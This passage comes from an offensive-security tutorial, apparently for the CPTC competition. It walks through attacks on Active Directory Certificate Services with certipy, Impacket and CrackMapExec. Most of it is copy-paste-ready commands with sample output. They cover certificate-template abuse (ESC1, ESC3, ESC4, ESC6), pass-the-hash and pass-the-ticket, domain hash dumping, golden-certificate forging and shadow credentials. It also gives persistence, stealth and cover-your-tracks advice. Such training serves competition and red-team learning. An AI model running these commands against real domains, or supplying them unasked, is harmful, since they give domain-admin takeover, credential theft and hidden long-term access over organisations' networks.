    -u 'administrator' \
    -H '8846f7eaee8fb117ad06bdd830b7586c' \
    -x "net group 'Domain Admins' /domain"

# Output:
# Domain Admins
# ------------------------
# Administrator
# DA-Admin
# ...

# Access C$ on Domain Controller
smbclient //192.168.1.10/C$ \
    -U 'administrator' \
    --pw-nt-hash 8846f7eaee8fb117ad06bdd830b7586c

# Browse DC filesystem
```

✅✅✅ **DOMAIN ADMIN ACHIEVED** ✅✅✅

---

#### Time Breakdown:

```
certipy find (enum):           30 seconds
certipy req (request cert):    10 seconds
certipy auth (authenticate):   15 seconds
secretsdump (dump hashes):     30 seconds
────────────────────────────────────────
Total time to Domain Admin:    ~2 minutes
```

---

### Step 17: ESC6 Exploitation - Abusing CA Flag

**ESC6 = Certificate Authority has `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled**

**Impact:** Can use ANY template (even "User" default) to specify SAN

---

#### Exploitation:

**Step 1: Confirm ESC6**

```bash
certipy find -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    -vulnerable

# Look for:
# [!] Certificate Authority 'CORP-DC01-CA' has flag set: User Specified SAN = Enabled
```

---

**Step 2: Request Certificate Using ANY Template**

```bash
# Use default "User" template (always available)
certipy req -u 'user@corp.local' -p 'Password123' \
    -ca 'CORP-DC01-CA' \
    -template 'User' \
    -upn 'administrator@corp.local' \
    -dc-ip 192.168.1.10

# Output:
# [+] Got certificate with UPN 'administrator@corp.local'
# [*] Saved certificate to 'administrator.pfx'
```

**Why this works:**
- ESC6 flag overrides template restrictions
- Even though "User" template doesn't allow SAN, CA flag makes it possible

---

**Step 3: Authenticate (Same as ESC1)**

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10

# Output: Administrator NTLM hash
```

---

**Step 4: Exploit (Same as ESC1)**

```bash
psexec.py -hashes ':NTLM_HASH' 'administrator@192.168.1.10'
```

**Total Time:** ~2 minutes (same as ESC1)

---

### Step 18: ESC4 Exploitation - Template Modification

**ESC4 = You have WriteDacl/WriteProperty on a certificate template**

**Impact:** Can modify template to make it ESC1-vulnerable, then exploit

---

#### Prerequisite Check:

```bash
certipy find -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    -vulnerable

# Look for:
# Template: SafeTemplate
#   [!] Vulnerabilities
#       ESC4: 'CORP\\IT-USERS' has dangerous permissions (WriteProperty)
```

---

#### Exploitation:

**Step 1: Backup Original Template Configuration**

```bash
certipy template -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    -template 'SafeTemplate' \
    -save-old

# Output:
# [*] Saved old configuration to 'SafeTemplate.json'
```

**Why:** Restore later to cover tracks / avoid breaking things

---

**Step 2: Modify Template to Enable SAN**

```bash
certipy template -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    -template 'SafeTemplate' \
    -save-old

# Certipy automatically modifies template to allow SAN specification
# No additional parameters needed
```

**Expected Output:**
```
[*] Modifying certificate template 'SafeTemplate'
[*] Enabling enrollee supplies subject
[+] Successfully modified template
```

---

**Step 3: Wait for Replication (Optional)**

```bash
# Wait 30-60 seconds for AD replication
sleep 60
```

**Why:** Template changes need to replicate across domain

---

**Step 4: Exploit as ESC1**

```bash
certipy req -u 'user@corp.local' -p 'Password123' \
    -ca 'CORP-DC01-CA' \
    -template 'SafeTemplate' \
    -upn 'administrator@corp.local' \
    -dc-ip 192.168.1.10

# Certificate issued with administrator SAN
```

---

**Step 5: Authenticate**

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
# Got administrator hash
```

---

**Step 6: (Optional) Restore Template**

```bash
certipy template -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    -template 'SafeTemplate' \
    -configuration SafeTemplate.json

# Output:
# [*] Restoring template configuration from SafeTemplate.json
# [+] Successfully restored template
```

**Why:**
- Covers your tracks
- Prevents breaking legitimate functionality
- Good OPSEC practice

---

### Step 19: ESC3 Exploitation - Enrollment Agent

**ESC3 = Two-step attack using enrollment agent template**

**Complexity:** Higher (requires two certificates)  
**For CPTC:** Usually skip if ESC1/ESC6 available

---

#### Concept:

```
Step 1: Request "Enrollment Agent" certificate
    ↓
Step 2: Use enrollment agent cert to request cert on behalf of administrator
    ↓
Step 3: Authenticate as administrator
```

---

#### Exploitation:

**Step 1: Request Enrollment Agent Certificate**

```bash
certipy req -u 'user@corp.local' -p 'Password123' \
    -ca 'CORP-DC01-CA' \
    -template 'EnrollmentAgent' \
    -dc-ip 192.168.1.10

# Output: enrollmentagent.pfx
```

---

**Step 2: Use Agent Cert to Request Another Cert**

```bash
certipy req -u 'user@corp.local' -p 'Password123' \
    -ca 'CORP-DC01-CA' \
    -template 'User' \
    -on-behalf-of 'CORP\administrator' \
    -pfx enrollmentagent.pfx \
    -dc-ip 192.168.1.10

# Output: administrator.pfx
```

---

**Step 3: Authenticate**

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

---

## Certificate-Based Authentication

### Step 20: Understanding Certipy Auth Output

**When you run `certipy auth -pfx cert.pfx`, several things happen:**

```
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

---

**Output Analysis:**

```
[*] Using principal: administrator@corp.local        ← 1
[*] Trying to get TGT...                             ← 2
[+] Got TGT                                          ← 3
[*] Saved credential cache to 'administrator.ccache' ← 4
[*] Trying to retrieve NT hash for 'administrator'   ← 5
[+] Got hash for 'administrator@corp.local': aad3... ← 6
```

**Step-by-Step:**

1. **Principal Extraction:** Reads SAN/UPN from certificate
2. **TGT Request (PKINIT):** Uses certificate for Kerberos authentication
3. **Success:** DC issued Ticket Granting Ticket
4. **Ticket Saved:** `.ccache` file contains Kerberos ticket
5. **Hash Retrieval Attempt:** Uses U2U (User-to-User) to get NTLM hash
6. **Hash Retrieved:** Full NTLM hash obtained

---

### Step 21: Using Retrieved Credentials

#### Credential Types You Get:

| Type | File | Use Case |
|------|------|----------|
| **TGT (Kerberos Ticket)** | `user.ccache` | Kerberos authentication (Pass-the-Ticket) |
| **NTLM Hash** | (in output) | Pass-the-Hash attacks |

---

#### Using TGT (Kerberos Ticket):

**Export to environment:**
```bash
export KRB5CCNAME=/path/to/administrator.ccache
```

**Use with Impacket:**
```bash
# PSExec with Kerberos
psexec.py -k -no-pass 'administrator@dc01.corp.local'

# SMBExec
smbexec.py -k -no-pass 'administrator@dc01.corp.local'

# WMIExec
wmiexec.py -k -no-pass 'administrator@dc01.corp.local'

# SecretsDump
secretsdump.py -k -no-pass 'administrator@dc01.corp.local'
```

**Advantages:**
- No NTLM authentication (stealthier)
- Works even if NTLM disabled
- Kerberos is less monitored

---

#### Using NTLM Hash:

```bash
# Extract hash from certipy auth output
# Hash format: LM:NT
# LM part: aad3b435b51404eeaad3b435b51404ee (empty LM hash)
# NT part: 8846f7eaee8fb117ad06bdd830b7586c (actual hash)

# Use NT part only:
NTLM_HASH="8846f7eaee8fb117ad06bdd830b7586c"

# Pass-the-Hash
psexec.py -hashes ":$NTLM_HASH" 'administrator@192.168.1.10'

# CrackMapExec
crackmapexec smb 192.168.1.10 -u 'administrator' -H "$NTLM_HASH"

# Evil-WinRM (if WinRM enabled)
evil-winrm -i 192.168.1.10 -u 'administrator' -H "$NTLM_HASH"
```

---

### Step 22: Troubleshooting Authentication Issues

**Problem 1: "KDC_ERR_PADATA_TYPE_NOSUPP"**

```
[-] Got error while trying to request TGT: KDC_ERR_PADATA_TYPE_NOSUPP
```

**Cause:** Domain Controller doesn't support PKINIT (certificate-based Kerberos)

**Solution:**
- Ensure DC is Windows Server 2008+ (PKINIT support)
- Check if PKINIT is enabled on DC

**Workaround (if PKINIT disabled):**
```bash
# Use Schannel authentication (alternative)
certipy auth -pfx cert.pfx -dc-ip 192.168.1.10 -ldap-shell
```

---

**Problem 2: Clock Skew**

```
[-] Got error: KRB_AP_ERR_SKEW
```

**Cause:** Time difference > 5 minutes between attacker and DC

**Solution:**
```bash
# Sync time with DC
sudo ntpdate -u 192.168.1.10

# Or
sudo timedatectl set-ntp true
```

---

**Problem 3: Certificate Expired**

```
[-] Got error: Certificate has expired
```

**Cause:** Certificate validity period has passed

**Solution:**
- Request new certificate
- Check template validity period before exploitation

---

**Problem 4: No NTLM Hash Retrieved**

```
[+] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[-] Could not get NT hash for 'administrator': User doesn't have a password
```

**Cause:** Account uses smart card or doesn't have NT hash

**Solution:**
- Use TGT directly (Pass-the-Ticket)
- U2U attack may not work for all accounts
- Still successful - use Kerberos ticket!

---

## Advanced Exploitation

### Step 23: Golden Certificate Attack (Persistence)

**Golden Certificate = Forging certificates using CA's private key**

**Impact:**
- **Persistence:** Certificates valid for years
- **Stealth:** Harder to detect than golden tickets
- **Reliability:** Works even if passwords change

**Prerequisite:** Compromised CA server

---

#### Obtaining CA Certificate & Key:

**Method 1: From Compromised CA Server**

```bash
# If you have admin on CA server
certipy ca -u 'administrator@corp.local' -p 'Password123' \
    -target ca-server.corp.local \
    -backup

# Output:
# [*] Creating backup of 'CORP-DC01-CA'
# [*] Saved certificate to 'CORP-DC01-CA.pfx'
```

---

**Method 2: Manually Extract (Windows)**

**On CA server (as admin):**
```powershell
# Export CA certificate with private key
certutil -backupKey -p "password123" C:\Temp\CABackup

# Copy files:
# C:\Temp\CABackup\*.p12 → Attacker machine
```

---

#### Forging Golden Certificate:

```bash
# Forge certificate for any user
certipy forge -ca-pfx 'CORP-DC01-CA.pfx' \
    -upn 'administrator@corp.local' \
    -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Output:
# [*] Saved forged certificate to 'administrator_forged.pfx'
```

---

#### Using Forged Certificate:

```bash
# Authenticate (same as legitimate cert)
certipy auth -pfx administrator_forged.pfx -dc-ip 192.168.1.10

# Obtain TGT and hash
# Use for access
```

---

**Persistence Advantage:**

```
Golden Ticket:
- Valid for 10 hours (default)
- Detected by krbtgt password rotation

Golden Certificate:
- Valid for 1-10 years (template validity)
- Only revoked by certificate revocation (rarely done)
- Survives password changes, krbtgt rotation
```

---

### Step 24: Shadow Credentials Attack

**Shadow Credentials = Add msDS-KeyCredentialLink attribute to user object**

**Impact:** Gain certificate-based authentication without requesting from CA

**Prerequisites:**
- WriteDacl or GenericWrite on target user
- Windows Server 2016+ (Key Trust support)

---

#### Exploitation:

**Add Shadow Credential:**

```bash
certipy shadow auto -u 'user@corp.local' -p 'Password123' \
    -target 'administrator' \
    -dc-ip 192.168.1.10

# Output:
# [*] Adding shadow credential to 'administrator'
# [*] Saved certificate to 'administrator_shadow.pfx'
```

---

**Authenticate:**

```bash
certipy auth -pfx administrator_shadow.pfx -dc-ip 192.168.1.10

# Obtain administrator hash
```

---

**Cleanup (Remove Shadow Credential):**

```bash
certipy shadow remove -u 'user@corp.local' -p 'Password123' \
    -target 'administrator' \
    -dc-ip 192.168.1.10

# Removes added credential (good OPSEC)
```

---

### Step 25: Certificate Persistence Techniques

**Using obtained certificates for long-term access:**

---

#### Technique 1: Certificate Expiry Monitoring

**Check certificate validity:**

```bash
# View certificate details
certipy cert -pfx administrator.pfx -export

# Output shows:
# Valid From: 2025-10-24
# Valid To: 2026-10-24  ← 1 year validity
```

**Plan:**
- Set reminder before expiry
- Re-request certificate using same technique

---

#### Technique 2: Multiple Certificate Extraction

```bash
# Request certificates for multiple high-value accounts

# Domain Admin
certipy req ... -upn 'DA-Admin@corp.local'

# Enterprise Admin
certipy req ... -upn 'EA-Admin@corp.local'

# Service Accounts (often never change passwords)
certipy req ... -upn 'sqlservice@corp.local'

# Backup Operators (can backup SAM/NTDS)
certipy req ... -upn 'backup-admin@corp.local'
```

**Result:** Multiple persistence paths

---

#### Technique 3: Offline Storage

```bash
# Store certificates securely
mkdir -p ~/persistence/corp-domain/certificates/
cp *.pfx ~/persistence/corp-domain/certificates/

# Encrypt storage
tar -czf certs.tar.gz ~/persistence/corp-domain/certificates/
gpg -c certs.tar.gz  # Encrypt with password

# Securely delete originals
shred -vfz *.pfx
```

---

## CPTC-Specific Techniques

### Step 26: CPTC Time-Optimized Workflow

**Goal:** Maximum impact in minimum time

---

#### CPTC AD CS Attack Workflow:

**Total Time Budget:** 10-15 minutes

```
┌─────────────────────────────────────────────────┐
│ CPTC AD CS Attack Timeline                      │
├─────────────────────────────────────────────────┤
│                                                 │
│ 00:00  Start certipy find                       │
│ 00:30  Review output                            │
│          ├─ ESC1/ESC6 found?                    │
│          │   └─ Go to exploitation (02:00)      │
│          └─ No ESC1/ESC6                        │
│              └─ Document, move to next vector   │
│                                                 │
│ 02:00  certipy req (request cert)               │
│ 02:15  certipy auth (get hash)                  │
│ 02:30  secretsdump (dump domain)                │
│ 05:00  Document finding                         │
│ 07:00  Screenshot evidence                      │
│ 10:00  Move to next attack vector               │
│                                                 │
└─────────────────────────────────────────────────┘
```

---

#### Quick Commands (Copy-Paste Ready):

**Enumeration:**
```bash
certipy find -u 'USER@DOMAIN' -p 'PASS' -dc-ip DC_IP -vulnerable -output DOMAIN-adcs
```

**Exploitation (ESC1):**
```bash
certipy req -u 'USER@DOMAIN' -p 'PASS' -ca 'CA-NAME' -template 'TEMPLATE' -upn 'administrator@DOMAIN' -dc-ip DC_IP && \
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

**Domain Dump:**
```bash
secretsdump.py -hashes ':NTLM_HASH' 'administrator@DC_IP' -just-dc -outputfile domain-dump
```

---

### Step 27: Evidence Collection for CPTC Reports

**Required Evidence for AD CS Finding:**

---

#### 1. Enumeration Output

```bash
# Save certipy find output
certipy find -u 'user@corp.local' -p 'Password123' \
    -dc-ip 192.168.1.10 \
    -vulnerable \
    -output evidence-adcs-enum

# Files for report:
# ✓ evidence-adcs-enum.txt  (full enumeration)
# ✓ evidence-adcs-enum.json (machine-readable)
```

**Screenshot:** Text output showing vulnerable template

---

#### 2. Vulnerable Template Configuration

**Screenshot of text output showing:**
```
Certificate Templates
  0
    Template Name                   : ESC1-Template
    Enrollment Permissions          : CORP\Domain Users
    Client Authentication           : True
    Requires Manager Approval       : False
    [!] Vulnerabilities
        ESC1: 'CORP\\Domain Users' can enroll...
```